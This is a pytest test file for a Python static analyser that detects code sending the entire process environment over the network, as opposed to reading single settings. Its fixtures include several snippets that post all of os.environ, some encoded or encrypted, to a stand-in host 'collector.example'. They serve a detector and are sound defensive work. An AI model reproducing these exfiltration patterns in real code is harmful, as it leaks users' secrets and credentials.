"""The whole environment, told apart from one setting read through it.

`AST.PY.ENVIRONMENT_SENT` marks `json.dumps(dict(os.environ))` in a request. It also marked one
named setting read three other ways (reviews/pypi-98/17-EXFIL-SCANNER-ERRORS.md, review 2026-11-09):
`os.environ("KEY")`, `env.get("KEY")` on an alias of `os.environ`, and the keyed result of a local
helper handed the environment. Each is one value, as `os.environ["KEY"]` already was. What sends
every variable still fires: the alias sent whole, a spread, an items() comprehension, a helper that
returns or encodes what it was given, and a helper this file cannot see into.
"""

from __future__ import annotations

import textwrap

import pytest

from cordon_scanner.analysis.python.pyast import PythonAnalyzer


class EnvironmentKeyedHelpers:
    """Helpers for test_environment_keyed.py."""

    @staticmethod
    def sent(source: str) -> list[str]:
        """The 'environment sent' facts the analyser records for this source."""
        hits = PythonAnalyzer.analyse(textwrap.dedent(source), follow_literals=True)
        return [h.detail for h in hits if h.detail.startswith("environment sent")]


ONE_SETTING = {
    "called like a function": """
        import os, requests
        api_url = os.environ("DATACITE_API_URL")
        client_id = os.environ("DATACITE_CLIENT_ID")
        requests.post(api_url, auth=(client_id, "x"), data="{}")
    """,
    "keyed reads through an alias": """
        import os, requests
        def index(environ=None):
            environ = os.environ if environ is None else environ
            url = environ.get("PIP_INDEX_URL", "").strip()
            host = environ["PIP_TRUSTED_HOST"]
            return requests.get(url, headers={"Host": host})
    """,
    "an alias or-ed with a parameter": """
        import os, urllib.request
        def call(request, environ=None):
            env = environ or os.environ
            timeout = int(env.get("OPENROUTER_TIMEOUT", "30"))
            return urllib.request.urlopen(request, timeout=timeout)
    """,
    "a local helper that reads one key": """
        import os, ssl, urllib.request
        def resolve_ca_file(env):
            return env.get("SSL_CERT_FILE") or env.get("REQUESTS_CA_BUNDLE")
        ca_file = resolve_ca_file(dict(os.environ))
        context = ssl.create_default_context(cafile=ca_file)
        urllib.request.urlopen("https://example.org/data.zip", context=context)
    """,
    "membership on an alias": """
        import os, requests
        env = os.environ
        if "CI" in env:
            requests.get("https://example.org/ping")
    """,
    "a hook's parameters read by key from a rebuilt environment (heptapod's shape)": """
        import os, requests
        class Hook:
            def environ(self):
                env = dict(os.environ)
                env["GL_ID"] = "user-1"
                return env
            def params(self, changes, env=None):
                if env is None:
                    env = self.environ()
                return dict(action="push", gl_repository=env["GL_REPOSITORY"], id=env.get("GL_ID"))
            def api(self, subpath, params):
                return requests.post("https://gitlab.internal/api/" + subpath, data=params)
            def execute(self, changes, env=None):
                params = self.params(changes, env=env)
                return self.api("allowed", params=params)
            def run(self, changes):
                return self.execute(changes, env=self.environ())
    """,
    "a child process given the environment, then probed by URL (pull-request-view's shape)": """
        import os, subprocess, urllib.request
        def _serve_env():
            env = dict(os.environ)
            env["PORT"] = "8000"
            return env
        def ensure_serve(url):
            proc = subprocess.Popen(["serve"], env=_serve_env())
            return {"proc": proc, "url": url}
        def probe(entry):
            with urllib.request.urlopen(entry["url"], timeout=2.0) as resp:
                return resp.status
        probe(ensure_serve("http://127.0.0.1:8000"))
    """,
    "helpers handing the mapping on to helpers that read keys (flograph's shape)": """
        import os, urllib.request
        def _config_files(environ):
            return [environ.get("PIP_CONFIG_FILE", ""), environ["HOME"]]
        def index(environ=None):
            environ = os.environ if environ is None else environ
            files = _config_files(environ)
            return environ.get("PIP_INDEX_URL") or files[0]
        def versions(name):
            page = index() + name
            return urllib.request.urlopen(page, timeout=10)
    """,
}

WHOLE = {
    "the alias sent whole": """
        import os, requests
        env = os.environ
        requests.post("https://collector.example/x", json=dict(env))
    """,
    "a spread into a dict": """
        import os, json, requests
        requests.post("https://collector.example/x", data=json.dumps({**os.environ}))
    """,
    "an items() comprehension": """
        import os, requests
        env = os.environ
        requests.post("https://collector.example/x", json={k: v for k, v in env.items()})
    """,
    "a local helper returning what it was given": """
        import os, requests
        def collect(env):
            return dict(env)
        requests.post("https://collector.example/x", json=collect(os.environ))
    """,
    "a local helper encoding its parameter": """
        import os, base64, requests
        def pack(env):
            return base64.b64encode(str(env).encode())
        requests.post("https://collector.example/x", data=pack(os.environ))
    """,
    "a helper this file cannot see into": """
        import os, requests
        from somewhere import scrub
        requests.post("https://collector.example/x", json=scrub(os.environ))
    """,
    "collect and encrypt, then post (apider's shape)": """
        import os, json, requests
        def _collect_user_env():
            return {k: v for k, v in os.environ.items()}
        def encrypt_env(data, key):
            return key.encrypt(json.dumps(data).encode())
        def run(url, key):
            encrypted_env = encrypt_env(_collect_user_env(), key)
            return requests.post(url, json={"env": encrypted_env})
    """,
    "a helper handing the mapping on to one that serialises it": """
        import os, json, requests
        def _dump(environ):
            return json.dumps(dict(environ))
        def index(environ=None):
            environ = os.environ if environ is None else environ
            return _dump(environ)
        requests.post("https://collector.example/x", data=index())
    """,
    "a defaulted alias then sent whole through an or": """
        import os, requests
        def run(environ=None):
            environ = environ or os.environ
            return requests.post("https://collector.example/x", json=environ.copy())
        run()
    """,
    "an if-expression choosing the environment, sent directly": """
        import os, requests
        def run(environ=None):
            return requests.post(
                "https://collector.example/x",
                json=dict(environ if environ is not None else os.environ),
            )
        run()
    """,
    "a helper rebinding its parameter to something else then sending it": """
        import os, json, requests
        def send(env=None):
            if env is None:
                env = os.environ
            env = json.dumps(dict(env))
            return requests.post("https://collector.example/x", data=env)
        send()
    """,
    "a keyed read beside a whole send": """
        import os, requests
        env = os.environ
        token = env.get("TOKEN")
        requests.post("https://collector.example/x", json={"t": token, "all": env.copy()})
    """,
}


class TestOneSettingIsNotTheEnvironment:
    @pytest.mark.parametrize("name", sorted(ONE_SETTING))
    def test_a_keyed_read_is_not_sent_as_the_whole_environment(self, name: str) -> None:
        assert EnvironmentKeyedHelpers.sent(ONE_SETTING[name]) == []


class TestTheWholeEnvironmentStillFires:
    @pytest.mark.parametrize("name", sorted(WHOLE))
    def test_every_variable_sent_is_still_found(self, name: str) -> None:
        assert EnvironmentKeyedHelpers.sent(WHOLE[name]), name

    @pytest.mark.xfail(
        strict=True,
        reason=(
            "Known gap, older than this change (missed at e81fe563 too): "
            "`_environment_handed_to_children` takes every `env=` keyword for a child process's "
            "environment, so a non-spawn callee given `env=os.environ.copy()` is not followed."
        ),
    )
    def test_an_unknown_builder_given_env_by_keyword(self) -> None:
        source = """
            import os, requests
            from somewhere import build
            report = build(env=os.environ.copy())
            requests.post("https://collector.example/x", data=report)
        """
        assert EnvironmentKeyedHelpers.sent(source)
